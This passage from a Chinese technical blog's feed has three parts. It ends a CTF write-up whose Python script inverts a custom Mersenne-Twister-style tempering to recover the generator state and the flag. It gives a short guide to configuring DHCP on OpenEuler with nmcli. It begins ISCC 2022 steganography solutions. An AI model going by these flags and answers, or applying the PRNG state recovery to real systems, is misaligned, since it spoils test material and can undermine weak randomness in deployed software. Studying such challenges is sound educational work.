class="hljs-number">319957702</span>, <span class="hljs-number">3661655667</span>, <span class="hljs-number">2809620731</span>, <span class="hljs-number">482011930</span>, <span class="hljs-number">3983483016</span>, <span class="hljs-number">82362287</span>, <span class="hljs-number">1518135562</span>, <span class="hljs-number">3490996143</span>, <span class="hljs-number">510129461</span>, <span class="hljs-number">1400609584</span>, <span class="hljs-number">2646113779</span>, <span class="hljs-number">732457215</span>, <span class="hljs-number">3735585198</span>, <span class="hljs-number">3451194227</span>, <span class="hljs-number">959269510</span>, <span class="hljs-number">244188667</span>]<br></code></pre></td></tr></table></figure><p>这里我也给出来吧，这样你们要是想做也能做了。</p><p>分析一下流程，我们最终实要得到这个<code>r.rand()</code>的值，我们才能得到flag。那么看一看rand是怎么运作的。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">if</span> self.index == <span class="hljs-number">0</span>:<br>self.generate()<br>y = self.MT[self.index]<br>y = y ^ self.cs2l(y, <span class="hljs-number">11</span>) ^ self.cs2l(y,<span class="hljs-number">15</span>)<br>y = y ^ self.cs2r(y,<span class="hljs-number">7</span>) ^ self.cs2r(y,<span class="hljs-number">19</span>)<br>self.index = (self.index + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br><span class="hljs-keyword">return</span> y<br></code></pre></td></tr></table></figure><p>可以看到，当index为0的时候，会将MT重新生成。</p><p>产生rand的时候，使用当前的index作为索引，使用MT[index]为基值进行变换最后得到我们的rand，同时index增长1。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>r = Myrand(<span class="hljs-built_in">int</span>(os.urandom(<span class="hljs-number">4</span>).<span class="hljs-built_in">hex</span>(),<span class="hljs-number">16</span>))<br>out = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>out.append(r.rand())<br></code></pre></td></tr></table></figure><p>在主流程的时里面，这里我们生成了624个rand。那么我们生成flag的时候，index的值是0。所以我们在生成flag的时候，MT表会先进行重新的生成。那么我们想要得到flag就得先得到对应的MT表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">y = self.MT[self.index]<br>y = y ^ self.cs2l(y, <span class="hljs-number">11</span>) ^ self.cs2l(y,<span class="hljs-number">15</span>)<br>y = y ^ self.cs2r(y,<span class="hljs-number">7</span>) ^ self.cs2r(y,<span class="hljs-number">19</span>)<br></code></pre></td></tr></table></figure><p>这里可以看到，我们的y是一种循环位移异或的生成方式，而且一共有3项，是奇数项。所以这个过程是可逆的可以计算的。具体的算法可以参照一下链接:</p><p><a href="https://www.cnblogs.com/Tf1shC4T/p/15927062.html">https://www.cnblogs.com/Tf1shC4T/p/15927062.html</a></p><p>那么我们就可以得到对应的MT表。然后对这个表进行重新生成，取第一个数进行随机数生成即可得到对应的flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py </span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;output.txt&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    data = <span class="hljs-built_in">eval</span>(fp.read())<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2l</span>(<span class="hljs-params">y, shift</span>):<br>    shift %= <span class="hljs-number">32</span><br>    <span class="hljs-keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2r</span>(<span class="hljs-params">y, shift</span>):<br>    shift %= <span class="hljs-number">32</span><br>    <span class="hljs-keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br><br><br>key_right = [<span class="hljs-number">7</span>, <span class="hljs-number">19</span>]<br>key_left = [<span class="hljs-number">11</span>, <span class="hljs-number">15</span>]<br><br><br><span class="hljs-comment"># 破解右移</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypted_first</span>(<span class="hljs-params">y, key</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        y = y ^ cs2r(y, key[<span class="hljs-number">0</span>]) ^ cs2r(y, key[<span class="hljs-number">1</span>])<br>        key = [k &lt;&lt; <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br>    <span class="hljs-keyword">return</span> y<br><br><br><span class="hljs-comment"># 破解左移</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypted_second</span>(<span class="hljs-params">y, key</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        y = y ^ cs2l(y, key[<span class="hljs-number">0</span>]) ^ cs2l(y, key[<span class="hljs-number">1</span>])<br>        key = [k &lt;&lt; <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br>    <span class="hljs-keyword">return</span> y<br><br><br>MT = []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        y = (MT[i] &amp; <span class="hljs-number">0x80000000</span>) + (MT[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>)<br>        MT[i] = MT[(i + <span class="hljs-number">397</span>) % <span class="hljs-number">624</span>] ^ (y &gt;&gt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> y &amp; <span class="hljs-number">1</span>:<br>            MT[i] ^= <span class="hljs-number">2567483520</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">index=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> index == <span class="hljs-number">0</span>:<br>        generate()<br>    y = MT[index]<br>    y = y ^ cs2l(y, <span class="hljs-number">11</span>) ^ cs2l(y, <span class="hljs-number">15</span>)<br>    y = y ^ cs2r(y, <span class="hljs-number">7</span>) ^ cs2r(y, <span class="hljs-number">19</span>)<br>    index = (index + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br>    <span class="hljs-keyword">return</span> y<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    MT = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        MT.append(decrypted_second(decrypted_first(i, key_right), key_left))<br>    <span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>    flag = <span class="hljs-string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="hljs-built_in">str</span>(rand()).encode()).hexdigest() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># DASCTF&#123;49e225e5b1b57a1d3c9803b5ddfd38f9&#125;</span><br><br></code></pre></td></tr></table></figure><p>这里对这个解密多将两句吧。</p><p>这个其实可以使用左移右移混杂的，只是这一题不行。</p><p>这个方法的使用条件是右边异或的项数必须是奇数个，而且第一项是没有位移的。</p><p>例如下面这种情况：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mi>x</mi><mo>⊕</mo><mo stretchy="false">(</mo><mi>x</mi><mo>⋙</mo><mi>p</mi><mo stretchy="false">)</mo><mo>⊕</mo><mo stretchy="false">(</mo><mi>x</mi><mo>⋘</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y = x \oplus (x \ggg p) \oplus (x \lll q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⋙</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⋘</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></span></p><p>那么对应的解密代码就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypted</span>(<span class="hljs-params">y, key</span>):<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bitslen): <span class="hljs-comment"># bitslen表示你进行运算的位宽度，这道题里面就是32位</span><br>y = y ^ cs2r(y, p) ^ cs2l(y, q)<br>key = [k &lt;&lt; <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br><span class="hljs-keyword">return</span> y<br></code></pre></td></tr></table></figure><p>提供对应的p,q也是可以解的。</p><h1 id="一些题外话"><a class="markdownIt-Anchor" href="#一些题外话"></a> 一些题外话</h1><p>好多题目都找不到writeup，每次打完一些比赛，想看看别人是怎么写出来那些我没写出来的题，但是基本上都找不到对应的Writeup。官方writeup也基本上没有。哎，也不认识那些大佬，想要题解都要不到。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>物理服务器OpenEuler系统DHCP网络环境配置</title>
    <link href="/2022/05/04/%E7%89%A9%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8OpenEuler%E7%B3%BB%E7%BB%9FDHCP%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2022/05/04/%E7%89%A9%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8OpenEuler%E7%B3%BB%E7%BB%9FDHCP%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>关于Taishan2280上的openeuler系统配置DHCP协议。</p><span id="more"></span><div class="note note-info">            <p>最后编辑于2022-05-05</p>          </div><p>学校有台Taishan2280服务器需要安装操作系统并且配置网络。需要安装的系统是OpenEuler。操作系统使用的是iBMC方式进行安装。这里不再赘述。</p><p>首先进入到服务器。</p><p>请在服务器对应的网口插入可以使用的网线。</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">nmcli dev status<br></code></pre></td></tr></table></figure><p>使用上述命令查看网络硬件设备。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli dev status<br>DEVICE      TYPE      STATE         CONNECTION<br>enp125s0f0  ethernet  已连接        web<br>virbr0      bridge    连接（外部）  virbr0<br>enp125s0f1  ethernet  已断开        --<br>enp125s0f2  ethernet  已断开        --<br>enp125s0f3  ethernet  已断开        --<br>lo          loopback  未托管        --<br>virbr0-nic  tun       未托管        --<br>[root@localhost ~]#<br></code></pre></td></tr></table></figure><p>这里我的enp125s0f0已经配置好了。</p><p>选择TYPE类型为ethernet的设备。记录下其设备名称。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">nmcli device connect device_name<br></code></pre></td></tr></table></figure><p>使用上述命令启用设备连接。</p><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli device connect  enp125s0f1<br>错误：添加/激活新连接失败：Connection &#x27;enp125s0f1&#x27; is not available on device enp125s0f1 because device has no carrier<br></code></pre></td></tr></table></figure><p>这里由于我的一号网口没有插网线这里是失败的。所以你需要选择已插入网线的网口。网口顺序一般在服务器上都有标注。然后选择对应的设备即可。</p><p>连接完成后，使用以下指令启用DHCP。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmcli connection add type ethernet con-name connection-name ifname interface-name<br></code></pre></td></tr></table></figure><p>其中 <code>connection-name</code> 和 <code>interface-name</code>需要填写自己的配置。 <code>connection-name</code>填写自己的网络配置名称，如果没有这个网络配置，将会自动创建。</p><p><code>interface-name</code>填写你刚刚连接的网络设备。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli connection  add type  ethernet  con-name  web ifname  enp125s0f0<br>Connection &#x27;web&#x27; (fde481a7-0aba-432a-9201-e27603e556e8) successfully added.<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli con show<br>NAME        UUID                                  TYPE      DEVICE<br>web         fde481a7-0aba-432a-9201-e27603e556e8  ethernet  enp125s0f0<br>virbr0      dcce16f4-1934-4663-a2d1-4a908901628e  bridge    virbr0<br>enp125s0f0  a86a2809-b241-4627-9969-9bc95bb42e81  ethernet  --<br>enp125s0f1  dee58f2b-420f-4ab5-9986-66b3315c4616  ethernet  --<br>enp125s0f2  4780278c-90f1-42d5-9dfb-ee9c306e03af  ethernet  --<br>enp125s0f3  2063cbc1-644b-47f9-a151-e9812b2c5ce5  ethernet  --<br></code></pre></td></tr></table></figure><p>这样DHCP服务就在对应的设备启用。接下来只需要Reboot即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">Welcome to 5.10.0-60.18.0.50.oe2203.aarch64<br><br>System information as of time:  2022年 05月 04日 星期三 18:46:55 CST<br><br>System load:    0.08<br>Processes:      700<br>Memory used:    2.1%<br>Swap used:      0%<br>Usage On:       8%<br>IP address:     192.168.1.84<br>IP address:     192.168.122.1<br>Users online:   1<br><br><br>[root@localhost ~]#<br></code></pre></td></tr></table></figure><p>可以看到我们的IP地址多了一个。这就成功了。对应网口已经分配得到了IP。</p><p>122.1那个地址是服务器iBMC地址。</p>]]></content>
    
    
    
    <tags>
      
      <tag>server</tag>
      
      <tag>OpenEuler</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC 2022</title>
    <link href="/2022/05/03/ISCC-2022/"/>
    <url>/2022/05/03/ISCC-2022/</url>
    
    <content type="html"><![CDATA[<p>ISCC 2022 中 单板小将苏翊鸣、 藏在星空中的诗、降维打击、2022冬奥会、真相只有一个、GetTheTable与Amy’s Code 的题解</p><span id="more"></span><p>时间挺长的，但是没啥时间来玩。话说为什么没有Crypto方向的</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="单板小将苏翊鸣"><a class="markdownIt-Anchor" href="#单板小将苏翊鸣"></a> 单板小将苏翊鸣</h2><p>下载附件后打开，是一张图片和一个压缩包。压缩包加密了，很明显密码应该在图片里。</p><p>图片属性和压缩包注释里面都没有有用的信息。用binwalk和foremost也没有分出来东西。</p><figure class="highlight less"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">Ih</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDD</span>þä<span class="hljs-selector-tag">t</span>:ÿ<span class="hljs-selector-tag">q</span>˜<span class="hljs-number">9</span>ñïÕ����<span class="hljs-selector-tag">IEND</span>®<span class="hljs-selector-tag">B</span>`‚<br></code></pre></td></tr></table></figure><p>用二进制查看器看看里面的内容，发现尾部有一些数据有点规律。而且这个数据是在图片的结束符之前的。所以可以看出来图像藏了东西，把图像的高改大一点就行。</p><p>改完之后图像出现了一个二维码。扫描。</p><p>得到内容：</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure"><span class="hljs-character">\u5728</span><span class="hljs-character">\u8fd9</span><span class="hljs-character">\u6b21</span><span class="hljs-character">\u51ac</span><span class="hljs-character">\u5965</span><span class="hljs-character">\u4f1a</span><span class="hljs-character">\u7684</span><span class="hljs-character">\u821e</span><span class="hljs-character">\u53f0</span><span class="hljs-character">\u4e0a</span><span class="hljs-character">\uff0c</span><span class="hljs-character">\u6211</span><span class="hljs-character">\u56fd</span><span class="hljs-character">\u5c0f</span><span class="hljs-character">\u5c06</span><span class="hljs-character">\u82cf</span><span class="hljs-character">\u7fca</span><span class="hljs-character">\u9e23</span><span class="hljs-character">\u65a9</span><span class="hljs-character">\u83b7</span><span class="hljs-character">\u4e00</span><span class="hljs-character">\u91d1</span><span class="hljs-character">\u4e00</span><span class="hljs-character">\u94f6</span><span class="hljs-character">\uff0c</span><span class="hljs-character">\u90a3</span><span class="hljs-character">\u4f60</span><span class="hljs-character">\u77e5</span><span class="hljs-character">\u9053</span><span class="hljs-character">\u6b64</span><span class="hljs-character">\u6b21</span><span class="hljs-character">\u51ac</span><span class="hljs-character">\u5965</span><span class="hljs-character">\u4f1a</span><span class="hljs-character">\u6211</span><span class="hljs-character">\u56fd</span><span class="hljs-character">\u603b</span><span class="hljs-character">\u5171</span><span class="hljs-character">\u83b7</span><span class="hljs-character">\u5f97</span><span class="hljs-character">\u51e0</span><span class="hljs-character">\u679a</span><span class="hljs-character">\u5956</span><span class="hljs-character">\u724c</span><span class="hljs-character">\u5417</span><span class="hljs-character">\uff1f</span><span class="hljs-character">\u53c8</span><span class="hljs-character">\u5206</span><span class="hljs-character">\u522b</span><span class="hljs-character">\u662f</span><span class="hljs-character">\u51e0</span><span class="hljs-character">\u91d1</span><span class="hljs-character">\u51e0</span><span class="hljs-character">\u94f6</span><span class="hljs-character">\u51e0</span><span class="hljs-character">\u94dc</span><span class="hljs-character">\u5462</span><span class="hljs-character">\uff1f</span><br></code></pre></td></tr></table></figure><p>这是unicode编码。转换一下得到：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">在这次冬奥会的舞台上，我国小将苏翊鸣斩获一金一银，那你知道此次冬奥会我国总共获得几枚奖牌吗？又分别是几金几银几铜呢？<br></code></pre></td></tr></table></figure><p>百度一下奥运奖牌榜。按照顺序进行组合。即可得到压缩包的密码。解压即可得到flag。</p><h2 id="藏在星空中的诗"><a class="markdownIt-Anchor" href="#藏在星空中的诗"></a> 藏在星空中的诗</h2><p>下载附件。得到三个文件。一个psd文件。一个压缩包。一个文本文件。文本文件内容如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">1：☆✪٭☪✲<br>2：✡🟇⍟⍟✸<br>3：🌠⍟🌟✡🟉<br>4：🟃🟀✪🟀⚝<br>5：✪🟔⍣☆🞱<br></code></pre></td></tr></table></figure><p>emmm… 全是特殊字符。压缩包带密码了，我们需要找到压缩包的密码是多少。</p><p>打开psd文件。发现里面有两个图层。第一个图层不透明度为5%。调整到100%。发现了一个五角星。表示的顺序为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>-&gt; <span class="hljs-number">3</span> -&gt; <span class="hljs-number">5</span> -&gt; <span class="hljs-number">2</span> -&gt; <span class="hljs-number">4</span> -&gt; <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>构成一个五角星。这里一开始以为最后还要回到1，后来发现不用。</p><p>压缩包的密码就是文本文件中的那几行标号按照提示的顺序组合。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">☆✪٭☪✲🌠⍟🌟✡🟉✪🟔⍣☆🞱✡🟇⍟⍟✸🟃🟀✪🟀⚝<br></code></pre></td></tr></table></figure><p>解压后得到一个Excel文件。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs subunit">A٭ U<span class="hljs-string">+066</span>D<br>B≛U<span class="hljs-string">+225</span>B<br>C⍟U<span class="hljs-string">+235</span>F<br>D⍣U<span class="hljs-string">+2363</span><br>E★U<span class="hljs-string">+2605</span><br>F☆U<span class="hljs-string">+2606</span><br>G☪U<span class="hljs-string">+262</span>A<br>H⚝U<span class="hljs-string">+269</span>D<br>I✡U<span class="hljs-string">+2721</span><br>J✦U<span class="hljs-string">+2726</span><br>K✧U<span class="hljs-string">+2727</span><br>L✪U<span class="hljs-string">+272</span>A<br>M✫U<span class="hljs-string">+272</span>B<br>N✮U<span class="hljs-string">+272</span>E<br>O✯U<span class="hljs-string">+272</span>F<br>P✴U<span class="hljs-string">+2734</span><br>Q🌟U<span class="hljs-string">+1</span>F31F<br>R🟌U<span class="hljs-string">+1</span>F7CC<br>S🟇U<span class="hljs-string">+1</span>F7C7<br>T🌠U<span class="hljs-string">+1</span>F320<br>U🟉U<span class="hljs-string">+1</span>F7C9<br>V🟀U<span class="hljs-string">+1</span>F7C0<br>W🟃U<span class="hljs-string">+1</span>F7C3<br>X🟆U<span class="hljs-string">+1</span>F7C6<br>Y🟐U<span class="hljs-string">+1</span>F7D0<br>Z🟔U<span class="hljs-string">+1</span>F7D4<br>=✲U<span class="hljs-string">+2732</span><br>&#123;✸U<span class="hljs-string">+2738</span><br>&#125;🞱U<span class="hljs-string">+1</span>F7B1<br><br></code></pre></td></tr></table></figure><p>然后把文本文件里面的字符按照表里给的对应英文字母替换即可。最后结果为：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 